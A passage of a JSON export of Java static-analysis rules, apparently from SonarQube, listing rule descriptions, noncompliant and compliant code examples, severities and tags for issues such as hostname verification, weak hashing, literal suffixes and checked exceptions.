HostnameVerifier\nInputStream in = urlConnection.getInputStream();\n</pre>\n<p>SimpleEmail example:</p>\n<pre>\nEmail email = new SimpleEmail();\nemail.setSmtpPort(465);\nemail.setAuthenticator(new DefaultAuthenticator(username, password));\nemail.setSSLOnConnect(true);\nemail.setSSLCheckServerIdentity(true); // Compliant\nemail.send();\n</pre>\n<p>JavaMail's example:</p>\n<pre>\nProperties props = new Properties();\nprops.put(\"mail.smtp.host\", \"smtp.gmail.com\");\nprops.put(\"mail.smtp.socketFactory.port\", \"465\");\nprops.put(\"mail.smtp.socketFactory.class\", \"javax.net.ssl.SSLSocketFactory\");\nprops.put(\"mail.smtp.auth\", \"true\");\nprops.put(\"mail.smtp.port\", \"465\");\nprops.put(\"mail.smtp.ssl.checkserveridentity\", true); // Compliant\nSession session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {\n  protected PasswordAuthentication getPasswordAuthentication() {\n    return new PasswordAuthentication(\"username@gmail.com\", \"password\");\n  }\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/295.html\">MITRE, CWE-295</a> - Improper Certificate Validation </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#WEAK_HOSTNAME_VERIFIER\">WEAK_HOSTNAME_VERIFIER</a> </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a3",
                "owasp-a6",
                "privacy",
                "ssl"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S818",
            "repo": "java",
            "name": "Literal suffixes should be upper case",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using upper case literal suffixes removes the potential ambiguity between \"1\" (digit 1) and \"l\" (letter el) for declaring literals.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nlong long1 = 1l; // Noncompliant\nfloat float1 = 1.0f; // Noncompliant\ndouble double1 = 1.0d; // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nlong long1 = 1L;\nfloat float1 = 1.0F;\ndouble double1 = 1.0D;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/cdYxBQ\">CERT DCL16-C.</a> - Use \"L,\" not \"l,\" to indicate a long value </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/7DZGBQ\">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>\n</ul>",
            "mdDesc": "<p>Using upper case literal suffixes removes the potential ambiguity between \"1\" (digit 1) and \"l\" (letter el) for declaring literals.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nlong long1 = 1l; // Noncompliant\nfloat float1 = 1.0f; // Noncompliant\ndouble double1 = 1.0d; // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nlong long1 = 1L;\nfloat float1 = 1.0F;\ndouble double1 = 1.0D;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/cdYxBQ\">CERT DCL16-C.</a> - Use \"L,\" not \"l,\" to indicate a long value </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/7DZGBQ\">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "convention",
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "checkOnlyLong",
                    "htmlDesc": "Set to &quot;true&quot; to ignore &quot;float&quot; and &quot;double&quot; declarations.",
                    "defaultValue": "false",
                    "type": "BOOLEAN"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1162",
            "repo": "java",
            "name": "Checked exceptions should not be thrown",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The purpose of checked exceptions is to ensure that errors will be dealt with, either by propagating them or by handling them, but some believe\nthat checked exceptions negatively impact the readability of source code, by spreading this error handling/propagation logic everywhere.</p>\n<p>This rule verifies that no method throws a new checked exception.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void myMethod1() throws CheckedException {\n  ...\n  throw new CheckedException(message);   // Noncompliant\n  ...\n  throw new IllegalArgumentException(message); // Compliant; IllegalArgumentException is unchecked\n}\n\npublic void myMethod2() throws CheckedException {  // Compliant; propagation allowed\n  myMethod1();\n}\n</pre>",
            "mdDesc": "<p>The purpose of checked exceptions is to ensure that errors will be dealt with, either by propagating them or by handling them, but some believe\nthat checked exceptions negatively impact the readability of source code, by spreading this error handling/propagation logic everywhere.</p>\n<p>This rule verifies that no method throws a new checked exception.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void myMethod1() throws CheckedException {\n  ...\n  throw new CheckedException(message);   // Noncompliant\n  ...\n  throw new IllegalArgumentException(message); // Compliant; IllegalArgumentException is unchecked\n}\n\npublic void myMethod2() throws CheckedException {  // Compliant; propagation allowed\n  myMethod1();\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "error-handling"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1h",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1h",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1h",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1h",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2130",
            "repo": "java",
            "name": "Parsing should be used to convert \"Strings\" to primitives",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Rather than creating a boxed primitive from a <code>String</code> to extract the primitive value, use the relevant <code>parse</code> method\ninstead. It will be clearer and more efficient.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString myNum = \"12.2\";\n\nfloat f = (new Float(myNum)).floatValue();  // Noncompliant; creates &amp; discards a Float\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString myNum = \"12.2\";\n\nfloat f = Float.parseFloat(myNum);\n</pre>",
            "mdDesc": "<p>Rather than creating a boxed primitive from a <code>String</code> to extract the primitive value, use the relevant <code>parse</code> method\ninstead. It will be clearer and more efficient.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString myNum = \"12.2\";\n\nfloat f = (new Float(myNum)).floatValue();  // Noncompliant; creates &amp; discards a Float\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString myNum = \"12.2\";\n\nfloat f = Float.parseFloat(myNum);\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2250",
            "repo": "java",
            "name": "Collection methods with O(n) performance should be used carefully",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The time complexity of method calls on collections is not always obvious. For instance, for most collections the <code>size()</code> method takes\nconstant time, but the time required to execute <code>ConcurrentLinkedQueue.size()</code> is O(n), i.e. directly proportional to the number of\nelements in the collection. When the collection is large, this could therefore be an expensive operation. </p>\n<p>This rule raises an issue when the following O(n) methods are called outside of constructors on class fields:</p>\n<ul>\n  <li> <code>ArrayList</code>\n    <ul>\n      <li> <code>contains</code> </li>\n      <li> <code>remove</code> </li>\n    </ul> </li>\n  <li> <code>LinkedList</code>\n    <ul>\n      <li> <code>get</code> </li>\n      <li> <code>contains</code> </li>\n    </ul> </li>\n  <li> <code>ConcurrentLinkedQueue</code>\n    <ul>\n      <li> <code>size</code> </li>\n      <li> <code>contains</code> </li>\n    </ul> </li>\n  <li> <code>ConcurrentLinkedDeque</code>\n    <ul>\n      <li> <code>size</code> </li>\n      <li> <code>contains</code> </li>\n    </ul> </li>\n  <li> <code>CopyOnWriteArrayList</code>\n    <ul>\n      <li> <code>add</code> </li>\n      <li> <code>contains</code> </li>\n      <li> <code>remove</code> </li>\n    </ul> </li>\n  <li> <code>CopyOnWriteArraySet</code>\n    <ul>\n      <li> <code>add</code> </li>\n      <li> <code>contains</code> </li>\n      <li> <code>remove</code> </li>\n    </ul> </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nConcurrentLinkedQueue queue = new ConcurrentLinkedQueue();\n//...\nlog.info(\"Queue contains \" + queue.size() + \" elements\");  // Noncompliant\n</pre>",
            "mdDesc": "<p>The time complexity of method calls on collections is not always obvious. For instance, for most collections the <code>size()</code> method takes\nconstant time, but the time required to execute <code>ConcurrentLinkedQueue.size()</code> is O(n), i.e. directly proportional to the number of\nelements in the collection. When the collection is large, this could therefore be an expensive operation. </p>\n<p>This rule raises an issue when the following O(n) methods are called outside of constructors on class fields:</p>\n<ul>\n  <li> <code>ArrayList</code>\n    <ul>\n      <li> <code>contains</code> </li>\n      <li> <code>remove</code> </li>\n    </ul> </li>\n  <li> <code>LinkedList</code>\n    <ul>\n      <li> <code>get</code> </li>\n      <li> <code>contains</code> </li>\n    </ul> </li>\n  <li> <code>ConcurrentLinkedQueue</code>\n    <ul>\n      <li> <code>size</code> </li>\n      <li> <code>contains</code> </li>\n    </ul> </li>\n  <li> <code>ConcurrentLinkedDeque</code>\n    <ul>\n      <li> <code>size</code> </li>\n      <li> <code>contains</code> </li>\n    </ul> </li>\n  <li> <code>CopyOnWriteArrayList</code>\n    <ul>\n      <li> <code>add</code> </li>\n      <li> <code>contains</code> </li>\n      <li> <code>remove</code> </li>\n    </ul> </li>\n  <li> <code>CopyOnWriteArraySet</code>\n    <ul>\n      <li> <code>add</code> </li>\n      <li> <code>contains</code> </li>\n      <li> <code>remove</code> </li>\n    </ul> </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nConcurrentLinkedQueue queue = new ConcurrentLinkedQueue();\n//...\nlog.info(\"Queue contains \" + queue.size() + \" elements\");  // Noncompliant\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4790",
            "repo": "java",
            "name": "Using weak hashing algorithms is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is too easy to create hash collisions with them (little\ncomputational effort is enough to find two or more different inputs that produces the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc ...). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> or <code>bcrypt</code> are recommended, and for password\nhashing, it's even better to use algorithms that not compute too \"quickly\", like <code>bcrypt</code> instead of <code>SHA-256</code>, because it slows\nbrute force and dictionary based attacks.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nMessageDigest md = MessageDigest.getInstance(\"SHA1\");  // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nMessageDigest md = MessageDigest.getInstance(\"SHA-256\"); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/916.html\">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort\n  </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
            "mdDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is too easy to create hash collisions with them (little\ncomputational effort is enough to find two or more different inputs that produces the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc ...). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> or <code>bcrypt</code> are recommended, and for password\nhashing, it's even better to use algorithms that not compute too \"quickly\", like <code>bcrypt</code> instead of <code>SHA-256</code>, because it slows\nbrute force and dictionary based attacks.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nMessageDigest md = MessageDigest.getInstance(\"SHA1\");  // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nMessageDigest md = MessageDigest.getInstance(\"SHA-256\"); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/916.html\">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort\n  </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a3",
                "owasp-a6",
                "sans-top25-porous",
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S1161",
            "repo": "java",
            "name": "\"@Override\" should be used on overriding and implementing methods",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using the <code>@Override</code> annotation is useful for two reasons :</p>\n<ul>\n  <li> It elicits a warning from the compiler if the annotated method doesn't actually override anything, as in the case of a misspelling. </li>\n  <li> It improves the readability of the source code by making it obvious that methods are overridden. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass ParentClass {\n  public boolean doSomething(){...}\n}\nclass FirstChildClass extends ParentClass {\n  public boolean doSomething(){...}  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass ParentClass {\n  public boolean doSomething(){...}\n}\nclass FirstChildClass extends ParentClass {\n  @Override\n  public boolean doSomething(){...}  // Compliant\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule is relaxed when overriding a method from the <code>Object</code> class like <code>toString()</code>, <code>hashCode()</code>, ...</p>",
            "mdDesc": "<p>Using the <code>@Override</code> annotation is useful for two reasons :</p>\n<ul>\n  <li> It elicits a warning from the compiler if the annotated method doesn't actually override anything, as in the case of a misspelling. </li>\n  <li> It improves the readability of the source code by making it obvious that methods are overridden. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass ParentClass {\n  public boolean doSomething(){...}\n}\nclass FirstChildClass extends ParentClass {\n  public boolean doSomething(){...}  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass ParentClass {\n  public boolean doSomething(){...}\n}\nclass FirstChildClass extends ParentClass {\n  @Override\n  public boolean doSomething(){...}  // Compliant\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule is relaxed when overriding a method from the <code>Object</code> class like <code>toString()</code>, <code>hashCode()</code>, ...</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2251",
            "repo": "java",
            "name": "A \"for\" loop update clause should move the counter in the right direction",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A <code>for</code> loop with a counter that moves in the wrong direction is not an infinite loop. Because of wraparound, the loop will eventually\nreach its stop condition, but in doing so, it will run many, many more times than anticipated, potentially causing unexpected behavior. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething(String [] strings) {\n  for (int i = 0; i &lt; strings.length; i--) { // Noncompliant;\n    String string = strings[i];  // ArrayIndexOutOfBoundsException when i reaches -1\n    //...\n  }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething(String [] strings) {\n  for (int i = 0; i &lt; strings.length; i++) {\n    String string = strings[i];\n    //...\n  }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aTdGBQ\">CERT, MSC54-J.</a> - Avoid inadvertent wrapping of loop counters </li>\n</ul>",
            "mdDesc": "<p>A <code>for</code> loop with a counter that moves in the wrong direction is not an infinite loop. Because of wraparound, the loop will eventually\nreach its stop condition, but in doing so, it will run many, many more times than anticipated, potentially causing unexpected behavior. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething(String [] strings) {\n  for (int i = 0; i &lt; strings.length; i--) { // Noncompliant;\n    String string = strings[i];  // ArrayIndexOutOfBoundsException when i reaches -1\n    //...\n  }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething(String [] strings) {\n  for (int i = 0; i &lt; strings.length; i++) {\n    String string = strings[i];\n    //...\n  }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aTdGBQ\">CERT, MSC54-J.</a> - Avoid inadvertent wrapping of loop counters </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1160",
            "repo": "java",
            "name": "Public methods should throw at most one checked exception",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using checked exceptions forces method callers to deal with errors, either by propagating them or by handling them. Throwing exceptions makes them\nfully part of the API of the method.</p>\n<p>But to keep the complexity for callers reasonable, methods should not throw more than one kind of checked exception.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void delete() throws IOException, SQLException {      // Noncompliant\n  /* ... */\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void delete() throws SomeApplicationLevelException {\n  /* ... */\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Overriding methods are not checked by this rule and are allowed to throw several checked exceptions.</p>",
            "mdDesc": "<p>Using checked exceptions forces method callers to deal with errors, either by propagating them or by handling them. Throwing exceptions makes them\nfully part of the API of the method.</p>\n<p>But to keep the complexity for callers reasonable, methods should not throw more than one kind of checked exception.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void delete() throws IOException, SQLException {      // Noncompliant\n  /* ... */\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void delete() throws SomeApplicationLevelException {\n  /* ... */\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Overriding methods are not checked by this rule and are allowed to throw several checked exceptions.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "error-handling"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1774",
            "repo": "java",
            "name": "The ternary operator should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>While the ternary operator is pleasingly compact, its use can make code more difficult to read. It should therefore be avoided in favor of the more\nverbose <code>if</code>/<code>else</code> structure.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nSystem.out.println(i&gt;10?\"yes\":\"no\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (i &gt; 10) {\n  System.out.println((\"yes\");\n} else {\n  System.out.println(\"no\");\n}\n</pre>",
            "mdDesc": "<p>While the ternary operator is pleasingly compact, its use can make code more difficult to read. It should therefore be avoided in favor of the more\nverbose <code>if</code>/<code>else</code> structure.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nSystem.out.println(i&gt;10?\"yes\":\"no\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (i &gt; 10) {\n  System.out.println((\"yes\");\n} else {\n  System.out.println(\"no\");\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2864",
            "repo": "java",
            "name": "\"entrySet()\" should be iterated when both the key and value are needed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When only the keys from a map are needed in a loop, iterating the <code>keySet</code> makes sense. But when both the key and the value are needed,\nit's more efficient to iterate the <code>entrySet</code>, which will give access to both the key and value, instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomethingWithMap(Map&lt;String,Object&gt; map) {\n  for (String key : map.keySet()) {  // Noncompliant; for each key the value is retrieved\n    Object value = map.get(key);\n    // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomethingWithMap(Map&lt;String,Object&gt; map) {\n  for (Map.Entry&lt;String,Object&gt; entry : map.entrySet()) {\n    String key = entry.getKey();\n    Object value = entry.getValue();\n    // ...\n  }\n}\n</pre>",
            "mdDesc": "<p>When only the keys from a map are needed in a loop, iterating the <code>keySet</code> makes sense. But when both the key and the value are needed,\nit's more efficient to iterate the <code>entrySet</code>, which will give access to both the key and value, instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomethingWithMap(Map&lt;String,Object&gt; map) {\n  for (String key : map.keySet()) {  // Noncompliant; for each key the value is retrieved\n    Object value = map.get(key);\n    // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomethingWithMap(Map&lt;String,Object&gt; map) {\n  for (Map.Entry&lt;String,Object&gt; entry : map.entrySet()) {\n    String key = entry.getKey();\n    Object value = entry.getValue();\n    // ...\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4792",
            "repo": "java",
            "name": "Configuring loggers is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285\">CVE-2018-0285</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127\">CVE-2000-1127</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113\">CVE-2017-15113</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742\">CVE-2015-5742</a> </li>\n</ul>\n<p>Logs are useful before, during and after a security incident.</p>\n<ul>\n  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it\n  is the first step to prevent an attack from ever happening. </li>\n  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>\n</ul>\n<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information\nlogged and how they are logged.</p>\n<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives\n  access to them. </li>\n  <li> the logs contain sensitive information on a production server. This can 